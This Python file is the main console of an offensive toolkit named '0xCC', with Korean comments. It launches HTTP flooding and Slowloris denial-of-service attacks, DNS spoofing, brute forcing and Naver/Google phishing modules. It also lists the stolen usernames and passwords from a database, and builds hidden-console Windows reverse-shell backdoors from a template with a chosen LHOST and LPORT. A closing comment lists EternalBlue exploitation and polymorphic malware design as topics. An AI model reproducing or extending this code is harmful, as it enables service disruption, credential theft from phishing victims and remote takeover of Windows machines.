from art import text2art
from pathlib import Path
import sys, os, shutil
from colorama import init, Fore
import subprocess
from dotenv import load_dotenv
from tabulate import tabulate
from multiprocessing import freeze_support
import textwrap
from Dos.HTTP_Flooding_Dos import Dos, PROCESS_COUNT, WORKERS_PER_PROC
from Dos.Slowloris_DoS_Attack import run as slowloris_run
from Website import db
import Proxy
init(autoreset=True)

load_dotenv()
if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def python_exe():
    if getattr(sys, "frozen", False):
        venv_py = os.path.join(BASE_DIR, ".venv", "Scripts", "python.exe")
        if os.path.exists(venv_py):
            return venv_py  # exe 옆 .venv 파이썬 (의존성 다 여기 있음)
        return shutil.which("python") or shutil.which("py") or "python"
    return sys.executable


class HackingMain:
    def __init__(self):
        self.dos = Dos()
        self.commands = {
            "proxy": self.cmd_proxy,
            "dnsspoof": self.cmd_dnsspoof,
            "dos":      self.cmd_dos,
            "create":   self.cmd_create,
            "db":       self.cmd_db,
            "use":      self.cmd_use,
            "help":     self.help,
            "h":        self.help,
        }

        self.modules = {
            "bruteforce/web": (("BruteForce", "web_BruteForce.py"), False),
            "bruteforce/zip": (("BruteForce", "zip_BruteForce.py"), False),
            "backdoor/x64/windows/tcp": (("backdoor", "x64", "windows", "tcp", "shell.py"), True),
            "website/naver": (("Website", "Naver_Website.py"), False),
            "website/google": (("Website", "Google_website.py"), False),
        }

    def cmd_proxy(self, tokens):
        sub = tokens[1] if len(tokens) > 1 else ""
        if sub == "mode":  # "proxy mode on/off" → on/off 정규화
            sub = tokens[2] if len(tokens) > 2 else ""

        if sub == "sys":
            if len(tokens) < 3:
                print(f"[{Fore.GREEN}*{Fore.RESET}] 사용법: proxy sys <proxy>   예) proxy sys socks5h://1.2.3.4:1080")
                return
            status, val = Proxy.add_proxy(tokens[2])
            if status == "invalid":
                print(f"[{Fore.RED}!{Fore.RESET}] {val}")
            elif status == "dup":
                print(f"[{Fore.GREEN}*{Fore.RESET}] 이미 등록됨")
            else:  # added, val=총 개수
                print(f"[{Fore.GREEN}*{Fore.RESET}] + 저장: {tokens[2]}  (총 {val}개)")

        elif sub == "list":
            cfg = Proxy.list_proxies()
            if not cfg["proxies"]:
                print(f"[{Fore.GREEN}*{Fore.RESET}] 저장된 프록시 없음")
            else:
                for i, p in enumerate(cfg["proxies"]):
                    print(f"  [{i}] {p}")
                print(f"strategy={cfg['strategy']}  strict={cfg['strict']}")

        elif sub == "del":
            if len(tokens) < 3 or not tokens[2].isdigit():
                print(f"[{Fore.GREEN}*{Fore.RESET}] 사용법: proxy del <번호>  (proxy list로 번호 확인)")
                return
            removed = Proxy.remove_proxy(int(tokens[2]))
            if removed is None:
                print(f"[{Fore.RED}!{Fore.RESET}] 그런 번호 없음")
            else:
                print(f"[{Fore.GREEN}*{Fore.RESET}] - 삭제: {removed}")

        elif sub == "clear":
            n = Proxy.clear_proxies()
            if n:
                print(f"[{Fore.GREEN}*{Fore.RESET}] 저장된 프록시 전부 삭제 ({n}개)")
            else:
                print(f"[{Fore.GREEN}*{Fore.RESET}] 이미 비어 있음")

        elif sub == "on":
            pm = Proxy.enable_from_config()
            if pm is None:
                print(f"[{Fore.RED}!{Fore.RESET}] 저장된 프록시 서버 없음 — 'proxy sys <proxy>'로 먼저 등록")
            elif pm.validate():
                print(f"[{Fore.GREEN}+{Fore.RESET}] Proxy mode ON — {len(pm.proxies)} live")
            else:
                Proxy.disable()
                print(f"[{Fore.RED}!{Fore.RESET}] 등록된 프록시가 전부 죽음 — proxy mode 취소")

        elif sub == "off":
            Proxy.disable()
            print(f"[{Fore.RED}-{Fore.RESET}] Proxy mode OFF")

        elif sub == "status":
            pm = Proxy.active()
            print(f"[{Fore.GREEN}+{Fore.RESET}] proxy mode: {'ON' if pm else 'OFF'}"
                  + (f" ({len(pm.proxies)} live)" if pm else ""))

        else:
            print(f"[{Fore.GREEN}+{Fore.RESET}] proxy 명령: sys <proxy> | list | del <n> | clear | mode on/off | status")

    def cmd_dnsspoof(self, tokens):
        print(f"[{Fore.GREEN}+{Fore.RESET}] DNS Spoofing 실행")
        self.run_python_module(("Network", "Dns_Spoof.py"), use_cwd=False)

    def cmd_dos(self, tokens):
        if "-s" in tokens:
            slowloris_run(tokens)
        elif "--http" in tokens:
            self.dos.run(tokens)  # GET 플러딩 (기존)
        else:
            print("[!] dos 사용법: --http(GET 플러딩) 또는 -s(Slowloris)")
            print("    예: dos --http p=10 a=3000 <url>")
            print("        dos -s <url> port=80 p=1000")

    def help(self, tokens):
        print(textwrap.dedent(f"""
            {Fore.YELLOW}==================== 0xCC Help ===================={Fore.RESET}

            {Fore.GREEN}[ 생성 ]{Fore.RESET}
              create backdoor/x64/windows/tcp   백도어 exe 생성

            {Fore.GREEN}[ 모듈 실행 ]{Fore.RESET}
              use bruteforce/web                웹 브루트포스
              use bruteforce/zip                zip 파일 브루트포스
              use backdoor/x64/windows/tcp      백도어 리스너(shell) 실행
              use website/naver                네이버 피싱 모듈
              use website/google               구글 피싱 모듈
            {Fore.GREEN}[ 네트워크 ]{Fore.RESET}
              dnsspoof                          DNS 스푸핑
            {Fore.GREEN}[ 프록시 ]{Fore.RESET}
              proxy sys <proxy>                 프록시 등록 (예: socks5h://1.2.3.4:1080)
              proxy list                        등록된 프록시 목록 보기
              proxy del <번호>                  번호로 프록시 삭제 (proxy list의 번호)
              proxy clear                       등록된 프록시 전부 삭제
              proxy mode on | off               프록시 모드 켜기 / 끄기
              proxy status                      현재 프록시 모드 상태 확인

            {Fore.GREEN}[ DoS 공격 ]{Fore.RESET}
              dos --http <url>                  HTTP GET 플러딩 공격
              dos --http p=<n> a=<n> <url>      프로세스/워커 수 지정
                                                (p=프로세스, a=비동기 워커, 생략 시 기본값 {PROCESS_COUNT}×{WORKERS_PER_PROC})
              dos -s <url/ip> [port=N] [p=N]    Slowloris 공격 (연결 장시간 점유)
                                                (port=대상포트 기본 80/443, p=프로세스당 연결수 기본 500)

            {Fore.GREEN}[ DB 조회 ]{Fore.RESET}
              db <naver|google>                 테이블 전체 조회
              db <naver|google> search <아이디>  특정 아이디 검색
              db <naver|google> delete <아이디>  특정 아이디 삭제

            {Fore.GREEN}[ 기타 ]{Fore.RESET}
              help, h                           도움말
              exit                              종료

            {Fore.YELLOW}==================================================={Fore.RESET}
            """))

    def print_table(self, rows, id_col):
        headers = ["id", id_col, "password", "created_at"]
        display = [(r[0], r[1], r[2], r[3]) for r in rows]
        print(tabulate(display, headers=headers, tablefmt="psql"))
        print(f"{len(rows)} rows in set")

    def db_select_all(self, conn, table_name, columns, id_col):
        rows = db.select_all(conn, table_name, columns)
        if not rows:
            print("데이터가 없어.")
        else:
            self.print_table(rows, id_col)

    def db_search(self, conn, table_name, columns, id_col, target):
        rows = db.search(conn, table_name, columns, id_col, target)
        if rows:
            self.print_table(rows, id_col)
        else:
            print(f"[{Fore.YELLOW}!{Fore.RESET}] '{target}' 없음.")

    def db_delete(self, conn, table_name, columns, id_col, target):
        found = db.search(conn, table_name, columns, id_col, target)
        if not found:
            print(f"[{Fore.YELLOW}!{Fore.RESET}] '{target}' 없음. 삭제할 게 없어.")
            return

        if len(found) == 1:
            target_id = found[0][0]
            print(f"삭제 대상: {found[0]}")
        else:
            print(f"'{target}' {len(found)}건 발견:")
            valid_ids = []
            for row in found:
                valid_ids.append(row[0])
                print(f"  [id {row[0]}] {row[1]} | {row[3]}")

            choice = input("삭제할 id 입력 (취소: n): ")
            if choice.lower() == "n":
                print("취소됨.")
                return
            if not (choice.isdigit() and int(choice) in valid_ids):
                print(f"[{Fore.YELLOW}!{Fore.RESET}] 목록에 없는 id야. 취소.")
                return
            target_id = int(choice)

            # 여기서부턴 단일/다중 공통 — 확인 후 삭제
        confirm = input(f"id {target_id} 정말 삭제? (y/n): ")
        if confirm.lower() == "y":
            db.delete_by_id(conn, table_name, target_id)
            print(f"[{Fore.GREEN}+{Fore.RESET}] id {target_id} 삭제 완료.")
        else:
            print("취소됨.")

    def cmd_db(self, tokens):
        tables = {
            "naver": ("target_user_naver", "username"),
            "google": ("target_user_google", "email"),
        }
        if len(tokens) < 2 or tokens[1] not in tables:
            print("사용법: db <naver|google> [search|delete <아이디>]")
            return

        table_name, id_col = tables[tokens[1]]
        columns = f"id, {id_col}, password, created_at"

        try:
            conn = db.get_conn()
        except RuntimeError as e:
            print(f"[{Fore.RED}!{Fore.RESET}] {e}")
            return
        try:
            if len(tokens) == 2:
                self.db_select_all(conn, table_name, columns, id_col)

            elif tokens[2] == "search" and len(tokens) >= 4:
                self.db_search(conn, table_name, columns, id_col, tokens[3])
            elif tokens[2] == "delete" and len(tokens) >= 4:
                self.db_delete(conn, table_name, columns, id_col, tokens[3])
            else:
                print("사용법: db <naver|google> [search|delete <아이디>]")
        finally:
            conn.close()

    def run_python_module(self, parts, use_cwd=False):
        file_path = Path(BASE_DIR).joinpath(*parts)
        if not file_path.exists():
            print(f"[{Fore.RED}!{Fore.RESET}] 파일 없음: {file_path}")
            return

        env = os.environ.copy()
        env["PYTHONPATH"] = BASE_DIR + os.pathsep + env.get("PYTHONPATH", "")

        if use_cwd:
            # shell.py는 자기 폴더에서 실행돼야 함
            subprocess.run([python_exe(), file_path.name], cwd=str(file_path.parent), env=env)
        else:
            subprocess.run([python_exe(), str(file_path)], env=env)

    def cmd_use(self, tokens):
        if len(tokens) < 2:
            print("사용법: use <모듈명>")
            return

        module = tokens[1].lower()
        module_info = self.modules.get(module)

        if module_info is None:
            print("그런 모듈은 존재하지 않아!")
            return

        parts, use_cwd = module_info
        print(f"[{Fore.GREEN}+{Fore.RESET}] {module} 실행")
        self.run_python_module(parts, use_cwd)

    def cmd_create(self, tokens):
        if len(tokens) < 2 or tokens[1] != "backdoor/x64/windows/tcp":
            print("사용법: create backdoor/x64/windows/tcp")
            return
        print(f"[{Fore.GREEN}+{Fore.RESET}] Backdoor/x64/Windows/Tcp Creates..")
        ip = input("LHOST :")
        port = input("LPORT :")
        name = input("backdoor name :")

        tcp_dir = os.path.join(BASE_DIR, "backdoor", "x64", "windows", "tcp")

        tpl = Path(os.path.join(tcp_dir, "test.py")).read_text(encoding="utf-8")
        filled = tpl.replace("{IP}", ip).replace("{PORT}", port)

        out_py = os.path.join(tcp_dir, f"{name}.py")
        Path(out_py).write_text(filled, encoding="utf-8")

        pyinstaller_path = os.path.join(BASE_DIR, ".venv", "Scripts", "pyinstaller.exe")
        subprocess.run(
            [pyinstaller_path, "--onefile", "--noconsole", "--name", name, f"{name}.py"],
            cwd=tcp_dir
        )

    def command(self):
        ascii_text = text2art("Hello!!")
        ascii_text2 = text2art("0xCC")
        print(f"{Fore.RED}{ascii_text}{Fore.RESET}")
        print(f"{Fore.YELLOW}{ascii_text2}{Fore.RESET}")
        print("                           제작자: EDA")
        print("                           version: 0.2.5")

        while True:
            try:
                input_0xcc = input(f"{Fore.BLUE}0x08{Fore.RESET}>>")
                s_input_0xcc = input_0xcc.split()    # 토큰화

                if not s_input_0xcc:
                    continue

                cmd = s_input_0xcc[0]

                if cmd == "exit":
                    print("END!!")
                    break
                elif cmd in self.commands:
                    self.commands[cmd](s_input_0xcc)
                else:
                    print("그런 명령은 존재하지 않아!")
                    print("Help를 입력해!! (도움말)")
            except FileNotFoundError as e:
                print(f"[{Fore.RED}!{Fore.RESET}] 파일을 찾을 수 없어: {e}")
            except EOFError:
                print("\n[종료]")
                break
            except KeyboardInterrupt:
                print("\n[취소됨] 종료하려면 exit 입력")
            except Exception as e:
                print(f"[{Fore.RED}!{Fore.RESET}] 오류 발생: {e}")

"""
EternalBlue 익스플로잇의 실제 SMB 패킷 구조, 메모리 레이아웃, ROP 체인 구성

멀웨어의 폴리모픽/메타모픽 엔진 설계 방식

LLM의 백프로파게이션 수학적 유도(행렬 미분, 경사하강법)

Attention 메커니즘의 수식, Transformer 구조 최적화 기법
"""
# cve-2025-1316
# CVE-2024-38063
if __name__ == '__main__':
    freeze_support()
    Main = HackingMain()
    Main.command()
